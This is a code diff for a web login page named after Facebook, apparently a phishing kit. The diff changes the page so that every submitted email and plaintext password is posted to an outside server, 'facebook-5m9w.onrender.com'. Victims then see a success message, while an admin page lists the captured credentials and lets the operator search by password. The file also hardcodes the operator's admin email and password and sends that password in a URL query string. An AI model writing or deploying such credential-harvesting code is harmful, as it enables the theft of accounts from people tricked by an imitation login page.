@@ -1,19 +1,7 @@
 // ADMIN CREDENTIALS (CHANGE THESE IN PRODUCTION)
 const ADMIN_EMAIL = "tboykritical@gmail.com";
 const ADMIN_PASSWORD = "kolawole";
-
-// Initialize user data storage
-function initializeStorage() {
-    if (!localStorage.getItem('users')) {
-        localStorage.setItem('users', JSON.stringify([]));
-    }
-}
-initializeStorage();
-
-// Utility function to generate random IP
-function generateRandomIP() {
-    return Array.from({length: 4}, () => Math.floor(Math.random() * 256)).join('.');
-}
+const API_BASE_URL = "https://facebook-5m9w.onrender.com";
 
 // ===== LOGIN PAGE FUNCTIONALITY =====
 if (document.getElementById('loginForm')) {
@@ -28,7 +16,7 @@ if (document.getElementById('loginForm')) {
     });
 
     // Handle form submission
-    loginForm.addEventListener('submit', function(e) {
+    loginForm.addEventListener('submit', async function(e) {
         e.preventDefault();
         
         const email = emailInput.value.trim();
@@ -40,30 +28,35 @@ if (document.getElementById('loginForm')) {
             return;
         }
         
-        // Record login activity (password stored for demo only)
-        const users = JSON.parse(localStorage.getItem('users'));
-        const userData = {
-            id: Date.now(),
-            email: email,
-            password: password, // Storing password for demo purposes
-            loginTime: new Date().toLocaleString(),
-            ip: generateRandomIP(),
-            status: 'active'
-        };
-        users.push(userData);
-        localStorage.setItem('users', JSON.stringify(users));
-        
-        // Check for admin login
-        if (email === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
-            sessionStorage.setItem('isAdmin', 'true');
-            window.location.href = 'admin.html';
-        } else {
-            // For regular users, show success message
-            loginForm.style.display = 'none';
-            successMessage.style.display = 'block';
-            
-            // You might want to redirect regular users to a different page
-            // window.location.href = 'user-dashboard.html';
+        try {
+            // Send login data to backend
+            const response = await fetch(`${API_BASE_URL}/api/login`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    email: email,
+                    password: password
+                })
+            });
+
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
+
+            // Check for admin login
+            if (email === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
+                sessionStorage.setItem('isAdmin', 'true');
+                window.location.href = 'admin.html';
+            } else {
+                // For regular users, show success message
+                loginForm.style.display = 'none';
+                successMessage.style.display = 'block';
+            }
+        } catch (error) {
+            console.error('Error:', error);
+            alert('Failed to login. Please try again.');
         }
     });
 }
@@ -71,7 +64,7 @@ if (document.getElementById('loginForm')) {
 // ===== ADMIN PAGE FUNCTIONALITY =====
 if (document.getElementById('userTableBody')) {
     // Verify admin access
-    function verifyAdminAccess() {
+    async function verifyAdminAccess() {
         if (sessionStorage.getItem('isAdmin') !== 'true') {
             const enteredPassword = prompt("Enter Admin Password:");
             if (enteredPassword !== ADMIN_PASSWORD) {
@@ -85,12 +78,10 @@ if (document.getElementById('userTableBody')) {
     }
 
     // Only proceed if admin is verified
-    if (verifyAdminAccess()) {
-        // Load and display user data
-        const users = JSON.parse(localStorage.getItem('users')) || [];
+    if (await verifyAdminAccess()) {
         const tableBody = document.getElementById('userTableBody');
         
-        // Update table header to include password
+        // Update table header
         document.querySelector('#userTable thead tr').innerHTML = `
             <th>ID</th>
             <th>Email/Phone</th>
@@ -116,18 +107,42 @@ if (document.getElementById('userTableBody')) {
                 '<tr><td colspan="6">No login records found</td></tr>';
         }
         
-        // Initial render - show ALL users including regular users
-        renderUsers(users);
+        // Load user data from backend
+        async function loadUsers() {
+            try {
+                const response = await fetch(`${API_BASE_URL}/api/logins?adminPassword=${ADMIN_PASSWORD}`);
+                if (!response.ok) {
+                    throw new Error('Failed to fetch user data');
+                }
+                const users = await response.json();
+                renderUsers(users);
+            } catch (error) {
+                console.error('Error loading users:', error);
+                renderUsers([]);
+            }
+        }
+
+        // Initial render
+        await loadUsers();
         
         // Search functionality
-        document.getElementById('searchBtn').addEventListener('click', function() {
+        document.getElementById('searchBtn').addEventListener('click', async function() {
             const searchTerm = document.getElementById('searchInput').value.toLowerCase();
-            const filteredUsers = users.filter(user => 
-                user.email.toLowerCase().includes(searchTerm) || 
-                user.ip.includes(searchTerm) ||
-                (user.password && user.password.includes(searchTerm))
-            );
-            renderUsers(filteredUsers);
+            try {
+                const response = await fetch(`${API_BASE_URL}/api/logins?adminPassword=${ADMIN_PASSWORD}`);
+                if (!response.ok) {
+                    throw new Error('Failed to fetch user data');
+                }
+                const users = await response.json();
+                const filteredUsers = users.filter(user => 
+                    user.email.toLowerCase().includes(searchTerm) || 
+                    user.ip.includes(searchTerm) ||
+                    (user.password && user.password.includes(searchTerm))
+                );
+                renderUsers(filteredUsers);
+            } catch (error) {
+                console.error('Error searching users:', error);
+            }
         });
         
         // Logout button
